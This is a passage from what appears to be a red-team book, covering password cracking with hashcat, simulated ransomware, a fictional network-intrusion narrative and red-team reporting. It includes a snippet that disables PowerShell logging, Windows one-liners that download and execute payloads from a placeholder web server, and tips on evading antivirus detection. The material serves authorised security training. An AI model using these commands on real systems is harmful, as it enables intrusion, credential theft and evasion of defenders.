79135.5 MH/s (33.88ms)\nSpeed.Dev .#4.....: 79051.6 MH/s (33.84ms)\nSpeed.Dev .#5.....: 79030.6 MH/s (33.85ms)\nSpeed.Dev .#6.....: 79395.3 MH/s (33.81ms)\nSpeed.Dev .#7.....: 79079.5 MH/s (33.83ms)\nSpeed.Dev .#8.....: 79350.7 MH/s (33.83ms)\nSpeed.Dev .#*.....: 633.7 GH/s\n \nThe total speeds  for NTLM are about 34% greater than using the TESLA\nGPU cards.  The total cost of running AWS is about $25 an hour.  So, it is\nreally up to you to figure out your own budget, requirements and goals. \n \nLab:\nRecently , Troy Hunt at Have I Been Pwned, released a SHA1 list of\npassword hashes that is about 5.3 GB compressed.  This is a very large list\nfrom previous breaches and data dumps.  This is a great lab to test your\npassword-cracking skills:\nhttps://downloads.pwnedpasswords.com/passwords/pwned-\npasswords-1.0.txt.7z\n \nAs these GPUs get faster and faster, passwords under 10 characters can be\nsmart-bruteforced in a relatively reasonable timeframe.  Some of those\nmight be cracked with good password masks, but for the most part, it comes\ndown to password lists.  Using password lists from real breaches is one of\nthe faste st ways to crack passwords larger than 12 characters.  Reviewing\nall the past breaches gives us a good look into how humans create\npasswords, common techniques to obfuscate passwords, and favorite words\nto use.  Using these lists with complex rule sets, allows us to crack\npasswords (som etimes greater that 25+ characters) at an imme nse speed. \nBut remember , your password list is dependent on how well you build and\nmaintain it.  As a Red Teamer , we regularly track all the accoun ts we crack,\nanalyze them, and add them to our lists.  We also constantly monitor for\nnew breaches, pastebin/pastie type sites, and more, to find new passwords. \nA great list to monitor can be found here:\nhttps://inteltechniques.com/OSINT/pastebins.html. \n \n \nFavorite Password Lists:\nberzerk0's Real-Password-WP A Password List:\n18.6 GB Uncompressed\nhttp://bit.ly/2EMs6am\nberzerk0's Dictionary-Style List:\n1 GB Uncompressed\nhttp://bit.ly/2GXRNus\nXato's T en Million Passwords\nmagnet:?\nxt=urn:btih:32E50D9656E101F54120ADA3CE73F7\nA65EC9D5CB\nHashes.or g\nhttps://hashes.or g/left.php\nMultiple Gigabytes and growing daily\nCrackstation\n15 GB Uncompressed\nhttps://crackstation.net/files/crackstation.txt.gz\nWeakpass\nTons of password lists\nhttps://weakpass.com/wordlist\nFirst20Hours\nThis repo contains a list of the 10,000 most common\nEnglish words in order of frequency , as determined by\nn-gram frequency analysis of the Google's T rillion\nWord Corpus.\nhttps://github.com/cyberspacekittens/google-10000-\nenglish\nSkullSecurity .org\nGreat older lists of passwords such as rockyou,\nmyspace, phpbb\nhttps://wiki.skullsecurity .org/Passwords\nDaniel Miessler's  Password Compilation\nhttps://github.com/cyberspacekittens/SecLists\nAdeptus-mechanicus Hash dumps\nhttp://www .adeptus-\nmechanicus.com/codex/hashpass/hashpass.php\n \nWith a combinat ion of good password lists, we can add rules on top of these\nlists to find even more password s.  In terms of Hashcat, rules define if any\nmodifications need be injected into the wordlist. The best way to describe\nrules is with this easy-to-follow example. We can take and use the\nKoreLogicRulesAppendY ears (http://contest-\n2010.korelogic.com/rules.html) set of rules, which looks like the following:\ncAz\"19[0-9][0-9]\"\nAz\"19[0-9][0-9]\"\ncAz\"20[01][0-9]\"\nAz\"20[01][0-9]\"\n \nIt will append the years from 1949 to 2019 in each and every password. If\nthe password list contained the word \"hacker\", it would try to crack the hash\nfor the string \"hacker1949\" all the way to \"hacker2019\". Remember , the\nmore complex rules you have, the more time it will take to finish going\nthrough all of the words in the word list.\n \nFortunately , we don't need to create our own rules as there are already\nplenty of great rules out there.   Of course, there are the default Hashcat\nrules, which come from many older breaches, and common password\nmanipulation techniques.  These are a great place to start.  Kore Rules come\nfrom a password competition by Korelogic and is one of the other standards\nout there .  Two other rules that definitely take much longer , but have great\ndetailed rule sets, are NSAKEY and the Hob0Rules.  In the past, I would\ntake all the rules, cat them into a single file, and unique the file.  However ,\nnow, NotSoSecure actually does this for you.  Rules:\nHashcat Rules\nhttps://github.com/hashcat/hashcat/tree/master/rules\nKore Rules\nhttp://contest-2010.korelogic.com/rules-hashcat.html\nNSAKEY Rules (One of my favorite) *Forked\nhttps://github.com/cyberspacekittens/nsa-rules\nPraetorian-inc Hob0Rules *Forked\nhttps://github.com/cyberspacekittens/Hob0Rules\nNotSoSecure - One Rule to Rule Them All *Forked\nhttps://github.com/cyberspacekittens/password_cracki\nng_rules\n \nGotta Crack Em All - Quickly Cracking as Many\nas You Can\nYou have a huge list of passwords from the Cyber Space Kittens\ncompromise.  With a limited amount of time, how can you get the best bang\nfor the buck?  The following walkthrough will guide you through the initial\nsteps we perform to crack as many passwords as we can.  Although, we\ntypically only need to find a couple of Domain Admin/LDAP\nAdmin/Enterprise Admin accounts, my OCD tendencies drive me to try and\ncrack all the passwords.\n \nBefore you start, you really need to understand the password format your\nhashes.  Hashcat has a great list of example hashes and what they look like\nhere: http://hashcat.net/wiki/doku.php?id=example_hashes.  Once you\nunderstand the hash type, it is always good to do some initial test runs to\nfigure out how fast or slow the password hashing algorithm is.  This will\nmake a huge difference in your password approach.  For example, when\nlooking at Windows hashes, we see that NTLM (Windows) performs about\n75,000 MH/s.  While a common Linux hash, SHA-256, perfor ms at a rate\nof about 5,000 MH/s.\n \nThis means for a SHA-256 hash, your GPU can guess 5,000,000,000 times\na second .  This can seem like a lot, but when you have huge wordlists and\nlarge rulesets, it might not be enough power .  This is because the algorithm\nfor SHA-256 is pretty slow and expensive to compute compared to\nsomething like NTLM, which can do 75,000,000,000 Hashes per second. \nIn our case, we are going all out, because why not?  We will be using eight\n1080TI GPUs and using a fast hash dump of NTLM. \n \nCracking the CyberSpaceKittens NTLM hashes:\nAfter getting domain admin access, you used your DCSync attack to dump\nall the hashes from the domain controller .  Your goal now is to try to crack\nas many hashes as you can.  You know that you will be able to use these\naccounts in future campaigns and show your victim company the poor\npassword practices they utilize. \n \nFirst, we save all the NTLM Windows hashes in a file called cat.txt.  To\nmake the output easier for the reader , we are going to omit the initial\nhashcat executio n commands.  Every command execution will start with\n\"hashcat -w 3 -m 1000 -o hashes.cracked ./hashes/cat.txt\", which states:\nhashcat: Run hashcat\n-w 3: Using the tuned profile\n-m 1000: Hash format is NTLM\n-o hashes.cracked: The output of the results into a file\n./hashes/cat.txt: Where our hashes are stored\n \nSo, whenever you see the [hashcat] string, replace it with the following\ncommand: \"hashcat -w 3 -m 1000 -o hashes.cracked ./hashes/cat.txt”.  Now ,\nlet’s crack the NTLM hashes as quickly and efficiently as we can on our 8\nGPU 1080TI rig.\n \nCrack all passwords that are 7 characters or less by using the\nattack mode “brute-force” (-a 3) for any alpha, numeric, or\nspecial character (?a) from one to seven characters in length (--\nincrement).\n[hashcat] -a 3 ?a?a?a?a?a?a?a --increment\nTotal T ime is about 5 minutes for 7 characters\nalpha/num/special.  W e can do 8 characters, but we\nare looking at a 9-hour run.\nYou can also limit the special characters to a select\nfew (!@#$%^) to dramatically decrease the time and\ncomplexity .\nNext, compare all the common password list dumps against our\nhashes.  The first file (40GB_Unique_File.txt) is a 3.2GB\npassword file, which takes about 9 seconds to run:\n[hashcat] ./lists/40GB_Unique_File.txt\nAs we can see the speed for even the lar gest files takes a matter\nof seconds.  T o improve ef ficiency , we can actually use the *\noperator and compare against every password list we have in our\n./lists/ folder .\n[hashcat] ./lists/*\nNext, based on the speed of the hashing algorithm, we can try\ndifferent rule sets on a single password list file.  W e are going to\nstart with the RockY ou rule set that takes about 2 minutes and 9\nseconds for these NTLM hashes:\n[hashcat] ./lists/40GB_Unique_File.txt  -r\n./rules/rockyou-30000.rule\nNote: The NSAKEY rule set with the 3GB file is\nabout 7 minutes and “The one rule to rule them all”\nrule set from NotSoSecure takes about 20 minutes.\nThis is when I circle back to the other password lists and rule set\ncombinations.  From the first pass of all the lar ge rule sets and\nlarge password breach lists, we generally get the 30%+ rate at a\nminimum.\nNext, we can start adding characters to the right of the password\nlists to improve our chances of longer password requirements. \nThe -a 6 switch command seen below will add every\nalpha/num/special character to the right of a password starting\nwith one character all the way up to four characters:\n[hashcat] -i -a 6 ./lists/found.2015.txt ?a?a?a?a\nNote:  This takes about 30 minutes to get to four\ncharacters\nWe can also add characters to the left of the password lists.  The\nfollowing command will add every alpha/num/special character\nto the left  of a password starting with one character all the way\nup to four characters:\n[hashcat] -i -a 7 ?a?a?a?a\n./lists/40GB_Unique_File.txt\nNote: This takes about 30 minutes to get to four\ncharacters\nHashcat Utils: https://github.com/hashcat/hashcat-utils/releases. \nHashcat has a bunch of tools to help build better password lists. \nOne example is combinator , which can take two or three\ndifferent password lists and make combinations.  Using small\nlists is relatively quick.  T aking our shortKrak list and\ncombining it with itself results in a very fast crack:\n./hashcat-utils-1.8/bin/combinator .bin\nlists/shortKrak.txt lists/shortKrak.txt >\nlists/comboshortKrak.txt\nTaking lists like the top Google 1000 words results in a file that\nis about 1.4 GB, so you will have to be careful of how lar ge of a\nfile you choose.\n./hashcat-utils-1.8/bin/combinator .bin\nlists/google_top_1000.txt lists/google_top_1000.txt >\nlists/google_top_1000_combo.txt\nNote: taking a 4MB file and running combinator will\nresult in a file that is greater than 25GB of storage. \nSo, be cautious of how big these files are.\nMany times, the passwords people use are not common\ndictionary words, but words based on their company , products,\nor services.  W e can create custom password lists using the client\nwebsites.  T wo tools that can assist are:\nBrutescrape - https://github.com/cheetz/brutescrape\nBurp W ord List Extractor -\nhttps://portswigger .net/bappstore/21df56baa03d499c8\n439018fe075d3d7\nNext, take all of your cracked passwords, analyze them, and\ncreate masks using https://thesprawl.or g/projects/pack/: \npython ./P ACK-0.0.4/statsgen.py hashes.password\npython ./P ACK-0.0.4/statsgen.py hashes.password --\nminlength=10 -o hashes.masks\npython ./P ACK-0.0.4/maskgen.py hashes.masks --\noptindex -q -o custom-optindex.hcmask\nRun password cracking with your newly created masks:\n[hashcat] -a 3 ./custom-optindex.hcmask\nTake your password lists through Pipal to better understand base\nwords (https://github.com/digininja/pipal):\ncd /opt/pipal\n./pipal.rb hashes.password\nLooking at this list, you might be able to figure out\nthis company uses resetme12345 as a default\npassword and could be located in Michigan (Detroit,\ntiger, football).\n \nWhere do you go from here?  There is always great research being done on\ndifferent password generation tools, analyses, and other techni ques to find\nfaster ways to crack passwords.  Some starting resources:\nA Deep Learning Approach for Password Guessing -\nhttps://github.com/brannondorsey/PassGAN\nFast, Lean, and Accurate: Modeling Password Guessability\nUsing Neural Networks  -\nhttps://www .usenix.or g/conference/usenixsecurity16/technical-\nsessions/presentation/melicher\n \nCreative Campaigns\nBeing on an internal Red Team for a corporation provides the opportunity\nfor creative campaigns.  One of my favorite campaigns is to simulate\nransomware.  In the past, we have been allowed to run simulated\nransomware campaigns during the WannaCry era.  As\ncryptoware/ransomware is becoming more and more popular , we really\nneed to be able to test our business recovery/disaster recovery procedures. \nWe all witnessed this in real life with WannaCry , which moved laterally\nthrough SMB shares, utilized exploits like EternalBlue, encrypted files, and\neven deleted all backups on the host system.  As an IT organization, the\nquestion we need to ask ourselves is, if one of our users clicked on that\nmalware, what would have been  the impact?  Could we have recovered user\nfiles, share files, databases, and more?  The answer we hear all the time is,\n\"I think so…\", but without a Red T eam to validate the processes in advance,\nwe end up waiti ng until after our house is burnt to the ground to know the\ntrue answer .\n \nThis is why I love having internal Red Teams for organizations.  We can\nreally prove and validate if security and IT is working, all within a\ncontrolled environment.  For this THP book, I did not include any of our\nexamples of ransomware, due to the fact that it is very risky to do.  I will\nleave it up to you to build the tools and test your clients in an approved\nmethod.\n \nSimulated Ransomware T ips:\nSome or ganizations won't actually let you delete/encrypt files. \nFor those companies, you can do a simulated ransomware\nbreach.  Once the malware is executed, all it will do is scan the\nhost/network for important files, read each file into memory , do\na byte for random byte swap, send those bytes to a C2 server ,\nand include metadata.  This will demonstrate how many files\nyou were able to touch, how much data you could exfiltrate out\nof their network before they detect the traf fic, and what files\nthey could recover .\nLook at other ransomware samples to see what file types they\nwere encrypting.  This could make for a more realistic\ncampaign.  For example, look at the file types from W annaCry\n(https://gist.github.com/rain-\n1/989428fa5504f378b993ee6efbc0b168).\nIf you are going to \"encrypt\" malware, do it with something\nsimple.  It could be a standard AES with a key , a public/private\nx509 cert, or some sort of bitwise XOR.  The more complicated\nyou make it, the higher the chance of not being able to recover\nthe files.\nTest, test, and test.  The worst thing you could do is find out the\ncompany can't recover critical files and your decryption process\ndoes not work.\nMany next gen A Vs automatically block ransomware based on\ncertain actions in a chain.  For example, a normal detection that\nransomware might perform is: scan the system for all files of\ntype X, encrypt a file, delete the shadow volume copy , and\ndisable backups.  T o get around the detection process, try either\nslowing this activity down or finding ways to get these same\ntactics executed, but through a dif ferent processes.\n \nDisabling PS Logging\nAs Red Teamers , we are always  looking for unique ways to try and disable\nany sort of logging.  Although there are ways to perform these  attacks, we\nstill continually search for new and easy techniques.\n \nHere is an example by leechristensen\n(https://github.com/leechristensen/Random/blob/master/CSharp/DisablePS\nLogging.cs) that could be used to disable PowerShell logging:\n$EtwProvider =\n[Ref].Assembly .GetT ype('System.Management.Automation.T rac\ning.PSEtwLogProvider').GetField('etwProvider','NonPublic,Stati\nc');\n$EventProvider = New-Object\nSystem.Diagnostics.Eventing.EventProvider -Ar gumentList\n@([Guid]::NewGuid());\n$EtwProvider .SetV alue($null, $EventProvider);\n \nWindows Download File from Internet Command\nLine\nIf you do get command execut ion through an application vulnerability or\nhave shell access through an Office file or PDF, the next steps could be to\ndownload and execute your secondary malware.  For those cases, there are\nWindows \"features\" we can abuse to get the job done.  Most of these\nexamples come from the great research of arno0x0x and @subtee\n(https://arno0x0x.wordpress.com/2017/1 1/20/windows-oneliners-to-\ndownload-remote-payload-and-execute-arbitrary-code/):\n \nmshta\nvbscript:Close(Execute(\"GetObject(\"\"script:http://webserver/pa\nyload.sct\"\")\"))\nmshta http://webserver/payload.hta\nrundll32.exe\njavascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"scr\nipt:http://webserver/payload.sct\");window .close();\nregsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll\ncertutil -urlcache -split -f http://webserver/payload payload\ncertutil -urlcache -split -f http://webserver/payload.b64\npayload.b64 & certutil -decode payload.b64 payload.dll &\nC:\\W indows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUt\nil /logfile= /LogT oConsole=false /u payload.dll\ncertutil -urlcache -split -f http://webserver/payload.b64\npayload.b64 & certutil -decode payload.b64 payload.exe &\npayload.exe\n \nThese are just a few examples, but there are plenty more method s of getting\nyour secondary code execution through a command line.  It is up to you to\nfind the other techniques to hide from traditional logging.\n \nGetting System from Local Admin\nGetting from a local administr ator account to System can be done in a\nvariety of ways.  The most common way, of course, is using Metasploit's\ngetsystem, but that isn't always available.  decoder -it\n(https://github.com/decoder -it/psgetsystem) created an awesome\nPowerShell scrip t to go from a Local Administrative PowerShell prompt to\nSystem by creating a new process which sets its parent PID of that new\nprocess to be owned by System.  This PowerShell can be found here:\nhttps://github.com/decoder -it/psgetsystem and executed with the following:\nPS> . .\\psgetsys.ps1\nPS>\n[MyProcess]::CreateProcessFromParent(<process_run_by_syste\nm>,<command_to_execute>)\n \n \nRetrieving NTLM Hashes without Touching\nLSASS\nElad Shamir performed extensive research and was able to figure out how\nto grab NTLM hashes without ever having to touch LSASS.  Prior to this\nattack, touching  LSASS to gain hashes via Mimikatz was limited by\nCredential Guard in Windows 10 Enterprise and Windows Server 2016. \nElad developed an attack called Internal Monologue Attack, that does the\nfollowing:\n \nDisable NetNTLMv1 preventive controls by changing\nLMCompatibilityLevel, NTLMMinClientSec and\nRestrictSendingNTLMT raffic to appropriate values, as described\nabove.\nRetrieve all non-network logon tokens from currently running\nprocesses and impersonate the associated users.\nFor each impersonated user , interact with NTLM SSP locally to\nelicit a NetNTLMv1 response to the chosen challenge in the\nsecurity context of the impersonated user .\nRestore the original values of LMCompatibilityLevel,\nNTLMMinClientSec and RestrictSendingNTLMT raffic.\n[https://github.com/eladshamir/Internal-Monologue]\n \n \nBuilding Training Labs and Monitor with\nDefensive Tools\nOne of the challenging parts of testing our malware is that we need to set up\nan environment for testing very quickly .  An awesome tool that Chris Long\nbuilt called Detection Lab (https://github.com/clong/DetectionLab) is a\ncollection of Packer and Vagrant scripts that allows you to quickly bring a\nWindows Activ e Directory online.  This tool comes complete with a\ncollection of endpoint security tooling and logging best practices. \nDetection Lab consists of four total hosts\n(https://medium.com/@clong/introducing-detection-lab-61db34bed6ae):\nDC: A W indows 2016 domain controller\nWEF: A W indows 2016 server that manages W indows Event\nCollection\nWin10: A W indows 10 host simulating a non-server endpoint\nLogger: An Ubuntu 16.04 host that runs Splunk and a Fleet\nserver\n \nC o n c l u s i o n\nWith Red Teams, tips and tricks are part of our craft.  We have to\ncontinually research for better ways to attack users, systems, and evade\ndetection.  There is no magic button.  It requires hours to years  of practice,\nsweat, and tears.\n \n \n \n9 two-minute drill - from zero to hero\n \n \n \n \n \n \nWith the clock ticking down, it is the last day of testing and you haven’ t had\nmuch success from the outside.  Y ou feel the pressure mounting as you need\nto gain access into the environment, understand their corporate layout, get\nto sensit ive files/code, pivot to different users and networks, and ultimately\nbreak into the classified Cyber Space Kittens program.  Y our mission was to\nsteal the new rocket secrets and you cannot fail . . . It is time for the two-\nminute drill.  With very little time left on the clock, you need to move the\nball from  the 10 yard line, break  through all the defensive prote ction, clean\nyour tracks, and make it down 90 yards to the touchdown zone. \n \n10 Yard Line\nYou go back through all of your notes to figure out what migh t have been\nmissed.  One of the web scrape screen shots captures your eye . . . it is a\nforum website for CSK.  You weren't able to find any vulnerabilities in the\napplication, but notice that the CSK forum is used by both employees and\npublic users to post questions, comments, and other things abou t their space\nprogram. \n \nYou scrape all of the users you can find on the site that look like they\nbelong to company accounts.  You then pull out your trusty list of\npasswords.  You run a brutef orce attempt on all these accounts with\ncommonly used passwords and variations.  Slowly , you see your Python\nscript going . . . failed . . . failled  . . . failed . . . password found!   You laugh\nas you see that one of the users, Chris Catfield, used the password\n“Summer2018!”.  That was just too easy you think to yourself.  Next, you\nlog into the forum as Chris, read through all his private message s and posts\nto figure out the best method to get your initial foothold.  You see that Chris\nregularly talks to another intern al employee on the forum, Neil Pawstrong,\nabout the space program.  It looks like they are not really friends , but have a\ngood working relationship.  This is good as it will make the next phish a\ntrusted attack.  Using Chris' account, we already have the rapport between\nthe two users and the likelihood of success is great. \n \n20 Yard Line\nYou debate whether or not you should send Neil a custom malware payload,\nas that might be too obvious.  Instead, you send a link to a cat photo\nwebpage that you have stood up with the message, “Hey Neil, I know you\nlove cats!  Check out this page I made!”\nA few minutes later, you get a message back on the forum site from Neil\nthat says, \"LOL,  I love space cats!\"  Little did Neil realize that the webpage\nhe visited had a custom JavaScript payload that ran code on his machine to\nscan his internal CSK network and compromise unauthenticated Jenkins\nand Tomcat webservers.  Within a few seconds, you start to get Empire\npayloads back and let out a sigh of relief. \n \n30 Yard Line\nAs your senses tingle, you know it is only a matter of time before the Blue\nTeam starts putting in firewall/DNS/host blocks, so you have to move\nquickly .  Fortunately , you have already set up the automation to do a lot of\nthe dirty  work.  The compromised host beacon activates and starts to run\ntools like Bloodhound, look for local passwords, set the registry bit to\ncapture Mimikatz LSASS passwords, run SPN and dump all Kerberos\ntickets, and of course set up persistence in scheduled tasks. \n \n40 Yard Line\nYou know that you need to move quickly off this initial box.  You take all\nthe Kerb eros tickets and dump them into Hashcat to start cracking.  It's a\ngood thing you found those extra bug bounties to buy a couple of 1080TI\nGPUs.  As they start cracking,  you see some service accoun t passwords\npopping up, but you don't have time for those yet.  You review the\nBloodhound output and realize that the compromised box belongs to Neil\nPawstrong and that his AD account has access to Buzz Clawdrin's box. \nUsing WMI, you remotely spawn another payload onto his system and\nmigrate into a process owned by Buzz.\n \n50 Yard Line\nLuckily for you, you are a local administrator on Buzz's box as well, which\nmeans they must do a lot of joint work.  Using the Bloodhound output, you\ntraverse through the network to the CSK-LAB box, but realize that you\ndon't have a local administrativ e account on this system.  No worries, you\nload up the PowerUp PowerShe ll script and look for misconfigurations on\nthat system which could allow  you to get to local admin.  Just as you\nthought, there are a ton of unquo ted paths for service binaries and you have\nthe ability to write your own payload there.  You quickly create a new\nmalicious binary that can now be triggered by the local system service. \n \n60 Yard Line\nYou get a new Cobalt Strike payload on your secondary C2 box, which\nallows you to maintain access even if they find parts of your campaign. \nTaking this new connection as System, you pillage through the box and find\nnumerous credentials in text files, stored in browsers, configured in\nWinSCP , and more.  This shared  box is a gold mine and has connectivity to\nmultiple servers and databases.  You notice that this machine is on a\ndifferent VLAN .  It looks like this system has access to multiple systems in\nthis network that Neil could n’t see before.  You run through your\ncommands again, running Bloodhound to understand what systems you\nsee.  You notice that many of these systems behind this network do not have\naccess to the internet, so you can't run HTTP beacons.  Howeve r, since you\nare using Cobalt Strike (https://www .cobaltstrike.com/help-smb-beacon),\nyou know it has a great feature that tunnels your compromis ed systems\nthrough named pipes (SMB).  This means that any additional systems that\nare compromised in the lab network VLAN, will route through the CSK-\nLAB box to get out to the internet.  Additionally , from running systeminfo\nand grabbing Windows Patch levels, you notice that these boxe s, which are\nall part of this semi-isolated network, aren't getting updates.  It looks like\nthe client machines are all running Windows 7 and haven't been patched for\nEternalBlue. \n \n70 Yard Line\nThrough the CSK-LAB box, you use your modified EternalBlue exploit to\nspawn SMB beacon payloads on numerous Windows 7 systems in the lab\nnetwork.  With all the new shells, you start pillaging them for information. \nYou notice that one of the systems has active connections to a remote\nMicrosoft SQL server named Restricted.  You try all of the accounts on the\nlab netw ork, but none of the usernames and passwords work for this\ndatabase.  Stumped, you go back through all of your notes and realize . . .\nyou forgot about your Kerberos tickets!  You SSH into your cracking box,\nreview the output, and find the ticket linked to the Restricted database.  A\nhuge wave of relief passes over you as you find the password to that service\naccount!\n \n80 Yard Line\nYou log into the Restricted DB and dump the whole database.  You are\ntempted to read it right on the spot, but you know time is limited.  You use\nsome of your PowerShell-fu to compress and encrypt the dump, then slowly\nexfiltrate betwee n the different compromised systems, and finally move it\noff their network onto your C2 server .  \n \nYou did it, you tell yourself, but as you slowly fall out of the happy dance\nzone, you realize there is still work left to be done.  You go back to your\ndifferent Bloodh ound dumps and notice the path through Purri Gagarin's\nmachine, who is part of the HelpDesk group.  Awesome—we will be able to\nuse this to Remote Connect either to a Domain Admin's box or through\nWindows ACE, then we can reset the password of a Domain Admin to a\npassword of our choice.  We go ahead and reset the passw ord of the\nDomain Admin , Elon Muskkat, and spawn a new payload as a full\nDOMAIN ADMIN!\n \n90 Yard Line\nThe last thing we need to do is dump all the hashes from the domain\ncontroller , set up additional backdoors, and leave our calling card.  Instead\nof using  the loud method (Shadow Volume Copy) to get all the domain\nhashes, you run Mimikatz's DCSync to pull all the user hashes, including\nthe krbtgt ticket.  We now have the golden ticket!  If we ever decide to\ncome back into the network, we can create our own Kerberos tickets and\nmove straight back to Domain Admin. \n \nTo continue with more backdo ors, we spread all of our techniques on\ndifferent boxes.  We set sticky keys on one of the user systems; use\nbackdoorfactory techniques to hide our malware in common binaries on\nanother system;.  set a scheduled task to run once a week to connect back to\none of our subdomains; take one of the segmented lab boxes and replace a\nuseless running service with a dnscat binary; and drop a couple of payloads\nin dif ferent systems’ startup folders.\n \nLuckily for us (but unlucky for them), we haven't been caught yet. \nHowever , remember the purpose of the Red Team assessment is to see how\nquickly they can identify malicious activity (which they didn't), and how\nquickly they perform IR/forensics and mitigate all the activity .  So, in your\nlast ditch attempt to trigger the Blue Team, you run\nhttps://github.com/EmpireProject/Empire/blob/master/data/module_source/t\nrollsploit/Get-RickAstley .ps1, enjoy a good laugh, and close your laptop. \nMission accomplished.\n \nTouchdown!\n \n10 post game analysis - reporting\n \n \n \n \n \nIn the prior THP books, we had examples on how to write penetration test\nreports and provided numerous sample templates.  These are great for the\nstandard week style penetration test engagements, but do not translate as\nwell for Red Team campaigns.   As stated throughout the book, the main\nfocus for Red Teams is not to identify vulnerabilities per se (although\nusually part of the campaign), but to test the people, the tools, the processes,\nand the skillsets of your employees.  If your company was attacked and\nsuccessfully compromised by an actor set or bad guy, what type of grade\nwould you give yourself?  I have always been against using gap assessment\nscores, ISO scores, maturity model scores, standard risk analysis, heat\ngraphs, and similar type reports to give a real-world view of your\ncompany's security program.\n \nPersonally , I love to see when companies implement controls  from prior\nRed Team campaigns to test if progress is really being made.  For example,\nfor a phishing campaign using similar doppelganger style domains, we have\nseen companies enable some of the following:\nAlert on Domains similar to their company using DNStwist\nA trusted list of external email domains.  Anything external that\ndoes not match will append a header to those emails visible to\nyour end user, saying that it is an external (non-company), non-\napproved email source.  This will help your users identify\nphishing easier .\nAny links in emails that come from domains that are\nuncategorized in the proxy should, at a minimum, have a click\nthrough and alert the user that it is uncategorized.\nDisallowing Office Macro Attachments, forcing protected view ,\nand sandboxing documents.\n \nThis is just a small number of easy things a company could implement that\ncould stop an attack.\n \nRemember , Red Teamers only need to find one hole to potentially\ncompromise an environment.  But, at the same time, Blue Teamers need to\nonly identify one of the TTPs (Tactics, Techniques, and Procedures) of an\nattacker to potentially stop a compromise.  Therefore, the question now\nbecomes, if one of these TTPs does alert from your toolset, how quickly\nwill your IR teams see it and react to it?\n \nSo what goes in a Red Team style report?  Since Red Teams are still pretty\nnew and there is currently no standard report template, we can just\ncustomize it to the client's needs.  From my perspective, since we may try to\nget into an environment multiple times  (and get caught a few times) during\na full campaign, we want show the good with the bad. \n \nIn terms  of taking notes during the campaign, many of the tools like Empire\nand Cobalt Strik e, have really good logs of the activities during a campaign,\nbut those might not always be adequate.  What I have found to be extremely\nuseful for our team’ s campaigns is to stand up a simple web server to record\neach of the activities a Red Team member performs.  Only the most basic\ninformation is collected during an engagement, which includes the specific\nevent, servers, descriptions, impacts, any alerts, and screenshots.  Most Red\nTeamers/Penetration Testers hate taking notes and something like this\nprovides an easy way to track the activity .\n \n \nOnce a campaign is finished, we take all of our notes and combine it to\nbuild a Red Team report that tells a story .  The main componen ts in a Red\nTeam Report may include:\nIntroduction/Scope: This section needs to clearly state the goals\nof the campaign.   For example, we have had customers ask us to\nget to specific data, get to domain admin, get PII, get IP , or find\na flag on a server in their production network. \nIndicators: It is extremely helpful for IR/Forensics teams to go\nbackwards after an engagement.  W e also want to identify where\ntheir tools or sensors might be lacking, disabling them to\nperform forensics or detect malicious activity .  Therefore, we\nwant to give indicators like IP addresses of C2 servers, domains\nused, MD5/SHA1 hashes of binaries, Email addresses and IP\ninformation, list of victims that were phished, and any other\ninformation that might help the forensics/IR team.\nTimeline of Attack: This is one of the most important parts of a\nRed T eam campaign and where taking good notes pays of f.  The\ntimeline should adequately state all the major activities, any\nTTPs that triggered an alert, and major campaign movements. \nThis will allow the Blue T eam to compare their timelines and\nnotes to see what gaps they missed.  How often in a real attack\ncan you ask the bad guys about everything they did?  This is\nextremely beneficial for the defensive teams to see.  An example\ntimeline might look like this:\n \n \nTime T o Detect (TTD)/T ime T o Mitigate (TTM): This is usually\nwhere we can work with the Blue T eam report to build statistics\non TTD/TTM.  T ogether , we want to identify how much time it\ntook for the teams to discover each of the multiple intrusions;\nhow much time passed, if any , before a scanning event triggered\nan investigation; and how much time it took for the Blue T eam\nto identify the phishing campaigns.  The second part should\ndiscuss statistics regarding the amount of time that passed before\nactions were taken.  If there were C2 communications that were\nalerted on or phishing that was identified, how long before the\ndomains were blocked on the firewall or DNS servers?  W e\noften see where companies might be good at blocking domains,\nbut quickly fail when the C2 servers communicate over IP (or\nvice versa).  W e want to make sure we track this activity and\nidentify it for our customers.  Another great TTM measurement\nis how quickly they can isolate a confirmed compromised\nsystem.  As malware becomes more and more automated, we\nneed to start utilizing smart and automated processes to isolate\nsystems or parts of the network from the rest of the or ganization.\nFeedback from the IR/Forensics Staf f: One of my favorite things\nto document is feedback from the Blue T eams on how they\nthought the overall campaign went from a defensive\nperspective.  What I am looking for is if they felt like they\nfollowed policy , if the incident lead person drove the\ninvestigations, if management got too involved, how security\ninteracted with IT to make any IT -related changes (firewall\nblocks, DNS modifications, and so on), and who panicked or\nstayed too calm. \nAs mentioned previously , the purpose of Red T eams is not about\nfinding vulnerabilities or compromising an environment\n(although that's the fun part); it is about improving an\norganization's overall security program and proving that certain\ngaps exist in their environment.  Many companies these days are\ntoo overconfident in their security programs, so they don't make\nchanges until they have been breached.  W ith Red T eams, we\ncan simulate the breach and encourage change without a real-life\nincident.\n \ncontinuing education\n \nSo the million dollar question I always get is, what do I do now?  I have\nread all the THP books, taken different training courses, and attended a\ncouple of confe rences. The best advice I can give now is that you should\nstart working on small projects and contributing to the security community . \nThis is the best way to really test your skills and up your game.\n \nSome ideas that could help:\nSet up a blog and your own Github account:   You should be\nwriting about all of your adventures and learnings.  Although,\nyou are sharing it with the world, it is really more for your own\ngrowth.  Having to blog about the things you are learning will\nhelp you improve your writing, better explain\nvulnerabilities/exploits in an easy-to-understand fashion, and\nensure you know the content well enough to explain it to the\nworld.\nYour r esume should be your Github account:   I always tell\nmy students that your Github account (or blog) should be able to\nstand on its own.  Whether it is just numerous small security\nprojects, such as making tools more ef ficient and ef fective, or\nyour own security project, your work should speak volumes on\nGithub.\nSpeaking at local confer ences:   Speaking can be extremely\ndaunting, but it puts you in leagues above other people if you\nhave it on your resume.  Where can you find places to speak?  I\nwould start at your local meetups (meetup.com) and find groups\nto get involved with.  They are usually small and everyone is\ngenerally pretty friendly .  If you are in the southern California\narea, I founded and currently run LETHAL\n(meetup.com/LETHAL), which is a free community-driven\nsecurity group, where dif ferent members present once a month. \nIn any case, get involved!\nBug Bounties:  No matter if you are on the of fensive or\ndefensive side, bounty programs can really help you step up\nyour game.  Bug bounty programs like HackerOne, BugCrowd,\nand SynAck are free to sign up.  Not only can you make decent\nmoney , but you can also legally hack their sites (staying within\nthe scope of their program, of course). \nCaptur e The Flag Competitions:   I know it is hard to find time\nto do all of these things, but I always tell my students that\nsecurity is not a job—it is a lifestyle.  